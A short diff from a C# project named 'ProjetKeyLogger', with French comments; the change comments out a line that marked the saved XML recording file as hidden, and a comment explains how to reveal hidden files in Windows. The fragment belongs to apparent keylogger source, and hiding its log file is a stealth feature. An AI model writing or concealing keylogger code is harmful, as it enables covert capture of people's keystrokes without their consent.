@@ -100,7 +100,7 @@ namespace ProjetKeyLogger
                             collection_enregistrement.saveToXml(file_path);
 
                             //on cache le xml
-                            File.SetAttributes(file_path, FileAttributes.Hidden);
+                          //  File.SetAttributes(file_path, FileAttributes.Hidden);
                             //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
 
 
